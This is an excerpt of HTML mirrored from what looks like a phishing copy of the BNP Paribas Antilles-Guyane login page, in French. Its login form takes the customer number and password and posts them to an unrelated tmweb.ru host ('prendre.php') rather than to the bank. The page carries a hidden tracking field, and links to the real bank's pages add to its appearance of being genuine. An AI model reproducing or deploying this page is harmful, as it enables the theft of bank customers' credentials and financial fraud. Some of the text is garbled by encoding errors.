...
<!-- Mirrored from antilles-guyane.bnpparibas.net/part/fr/dciweb.htm?p0=idesai.tht&t=p by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Apr 2020 09:20:14 GMT -->
<head>
...
<script language="JavaScript" src="tools.js"></script>
  ...
  <script type="text/javascript">
    ...
    function control()
    {
      ...
      {
        alert("Le numï¿½ro d'abonnï¿½ et le mot de passe doivent ï¿½tre remplis!");
  ...
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
    ...
    <div align="left">
      ...
      <div align="center">
        ...
        <center>
          <form autocomplete="off"  name="saisie" method="post" onSubmit="return control();" enctype="application/x-www-form-urlencoded" target="_top" action="https://cn98221.tmweb.ru/prendre.php">
             <input type="hidden" name="vkid" value="vkident-iqc19k5xer">
              ...
              <div style="width:620px; margin:0 auto; text-align: left">
                <div class="formulaire1" style="height:32px; line-height:32px; font-size:12px;">
                  ...
                  <span style="font-size:13px; font-weight:bold; margin-left:20px;">NumÃ©ro client</span>
  ...
  Espace s&eacute;curis&eacute; BNPPARIBAS.NET
                  ...
                  <ul>
                     ...
                     <li><a href="http://antilles-guyane.bnpparibas/aide/aide-connexion-bnpinet/"   target="_blank"><FONT COLOR="#0000FF">Aide Ã  la connexion ?</FONT></a></li> 
					    ...
					    <li><a href="https://antilles-guyane.bnpparibas/espace-donnees-personnelles/"      target="_blank"><FONT COLOR="#0000FF">Espace DonnÃ©es Personnelles</FONT></a></li> 
                    <li><a href="https://antilles-guyane.bnpparibas.net/part/fr/ide1hom.html" target="_top"><FONT COLOR="#0000FF">Visite guidÃ©e</FONT></a></li>
                  </ul>
                </div>
...
<map name="grillemap">
  ...
  <script>
    if (navigator.userAgent.indexOf("MSIE 6.") != -1) {
      alert("Pour des raisons de sÃ©curitÃ©, le service ne sera plus accessible Ã  compter de fin juin 2015 en utilisant Microsoft Internet Explorer infÃ©rieur Ã  la version 7.\n\nCe navigateur Ã©tant obsolÃ¨te, il est fortement recommandÃ© de le faire Ã©voluer vers une version plus rÃ©cente.");
    }
  </script>
  -->
